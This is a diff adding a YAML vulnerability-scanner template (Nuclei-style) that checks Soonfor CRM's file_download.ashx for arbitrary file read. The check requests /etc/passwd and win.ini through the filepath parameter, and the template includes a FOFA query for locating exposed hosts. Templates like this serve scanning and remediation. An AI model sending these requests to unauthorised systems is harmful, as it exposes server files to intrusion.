@@ -1,0 +1,37 @@
+id: soonfor-file_download-fileread
+info:
+  name: 数夫CRM接口file_download存在任意文件读取
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/%E6%95%B0%E5%A4%ABCRM/%E6%95%B0%E5%A4%ABCRM%E6%8E%A5%E5%8F%A3file_download%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: icon_hash="-244202779" || title="数夫CRM客户关系管理系统" || title="数夫CRM系统" || body="tanwh" && body="数夫CRM"
+    tips:
+    repair:
+    version:
+  tags: fileread,soonfor
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Web/common/Handler/file_download.ashx?filepath=C:/Windows/win.ini"
+      - "{{BaseURL}}/Web/common/Handler/file_download.ashx?filepath=/etc/passwd"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
